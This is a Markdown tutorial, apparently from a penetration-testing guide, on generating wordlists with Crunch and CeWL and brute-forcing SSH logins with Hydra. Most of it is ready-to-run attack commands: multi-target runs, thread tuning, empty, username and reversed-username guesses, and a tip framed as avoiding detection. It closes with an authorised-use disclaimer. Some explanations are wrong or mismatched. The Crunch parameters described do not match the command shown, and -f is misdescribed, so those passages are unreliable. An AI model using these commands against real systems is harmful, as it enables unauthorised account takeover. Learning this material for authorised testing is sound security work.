---
title: "Creating Custom Wordlists and Rules for Hydra"
description: "Learn more about Hydra"
icon: "code"
draft: false
---

To effectively use Hydra for brute-forcing SSH connections, creating custom wordlists and rules is crucial. Custom wordlists tailored to specific targets can significantly enhance the success rate of brute-force attacks. This guide will cover methods to create custom wordlists and define rules for their efficient use with Hydra.

## Why Create Custom Wordlists?

Using generic wordlists like `rockyou.txt` can be effective, but they may not always suit specific targets. Custom wordlists can:
- Tailor attacks to specific targets based on gathered information.
- Include unique or uncommon passwords.
- Increase the chances of successful brute-force attempts.

## Creating Custom Wordlists

### 1. Using `Crunch` to Generate Wordlists

Crunch generates wordlists based on specified criteria. It's useful for creating lists of various lengths and patterns.

Install Crunch:

```bash
sudo apt install crunch
```

When creating the wordlist, we will typically use this command
```sh
crunch <min> <max> <charset>
```

- min: is the minimun password length
- max: is the maximum password length
- charset: Character se to be used

Generate a wordlist with all combinations of letters:

```bash
crunch 3 6 0123456789
```

- **8**: Minimum length of words.
- **10**: Maximum length of words.
- **abcdefghijklmnopqrstuvwxyz**: Character set.
- **-o wordlist.txt**: Output file.

<a target='_blank'><img src='https://i.postimg.cc/FK2rgDzL/image.png' border='0' alt='image'/></a>

#### Creating Wordlist in a text file.

If you want your wordlist file in text format run this command on your terminal

```sh
crunch 3 6 0123456789 -o list.txt
```

#### Creating  Custom Wordlist With Letters, Symbols, and Numbers.

This Step is for Mixed with  letters, Symbols, Numbers and creating a custom wordlist Run this command on Your terminal

```sh
crunch 4 8 123abcdefgh#$% -o list2.txt
```
- –o : Output in a textfile. along with name of the text file.

### 2. Using `CeWL` to Generate Wordlists

CeWL (Custom Word List generator) is a ruby app that spiders a given URL to a specified depth and generates a custom wordlist from the text found on the website.

Install CeWL:

```bash
sudo apt-get install cewl
```

Generate a wordlist:

```bash
cewl http://example.com -m 5 -w wordlist.txt
```

- **http://example.com**: Target URL.
- **-m 5**: Minimum word length (5 characters).
- **-w wordlist.txt**: Output file.

## Combining Multiple Wordlists

You can merge several wordlists into one to cover a broader range of possibilities.

```bash
cat wordlist1.txt wordlist2.txt > combined_wordlist.txt
sort combined_wordlist.txt | uniq > final_wordlist.txt
```

- **cat**: Concatenates files.
- **sort**: Sorts the combined list.
- **uniq**: Removes duplicate entries.

## Creating Rules for Hydra

Hydra supports various flags and options to customize brute-force attacks. Understanding and applying these rules can optimize the attack process.

### Specifying Usernames and Passwords

Using a custom username list:

```bash
hydra -L custom_userlist.txt -P pass.txt 192.168.29.135 ssh -t 4
```

Using a custom password list:

```bash
hydra -l username -P custom_passlist.txt 192.168.29.135 ssh -t 4
```

### Customizing Thread Count

Adjust the number of parallel threads to balance speed and server load:

```bash
hydra -L user.txt -P pass.txt 192.168.29.135 ssh -t 8
```

### Targeting Multiple IPs

To target multiple IP addresses simultaneously:

```bash
hydra -L user.txt -P pass.txt -M ip_list.txt ssh -t 4
```

### Advanced Password Guessing with `-e` Flag

The `-e` flag in Hydra adds extra password guessing techniques:

```bash
hydra -l username -P pass.txt 192.168.29.135 -e nsr ssh
```

- **-e n**: Try empty passwords.
- **-e s**: Try the username as the password.
- **-e r**: Try the reverse of the username.

### Verbose Mode and Detailed Output

Enable verbose mode for detailed output:

```bash
hydra -L user.txt -P pass.txt 192.168.29.135 ssh -V
```

### Changing Default SSH Port

Specify a custom SSH port if the target uses a non-standard port:

```bash
hydra -s 2222 -L user.txt -P pass.txt 192.168.29.135 ssh -t 4
```

### Using Custom Login Attempts

Limit login attempts to avoid detection and blocking:

```bash
hydra -L user.txt -P pass.txt 192.168.29.135 ssh -t 4 -f
```

- **-f**: Exit after the first successful login.

## Conclusion

Creating custom wordlists and using Hydra for brute-force attacks should always be done ethically and legally. Unauthorized access to systems is illegal and punishable by law. Use these techniques only for authorized penetration testing and security assessments.

By creating custom wordlists and applying advanced rules, security professionals can more effectively test the strength of SSH credentials and enhance their overall security measures.